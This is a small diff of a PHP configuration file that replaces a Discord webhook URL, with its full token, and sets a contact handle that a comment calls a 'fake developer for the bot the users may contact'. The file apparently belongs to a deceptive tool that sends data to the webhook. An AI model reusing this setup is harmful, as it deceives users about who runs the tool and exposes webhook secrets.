@@ -1,6 +1,6 @@
 <?php
     // webhook link
-    $webhook = "https://discord.com/api/webhooks/781306315725078538/92kXwcI2kO0C5LumuoVGTTyZTKeVC3-gjDSf02_hfy-OL3qGaXyXeWMrECrm3v-o8fy0";
+    $webhook = "https://discord.com/api/webhooks/874795780060364921/tsRSHur5XB2gV9g0zbHyldKfW6zUmHlX5oJQ6kwglPrQs9YznOLZmAlidh3Nkk7-EI2Y";
     // fake developer for the bot the users may contact
     $discord_contact = "TeeScrap#1474";
     
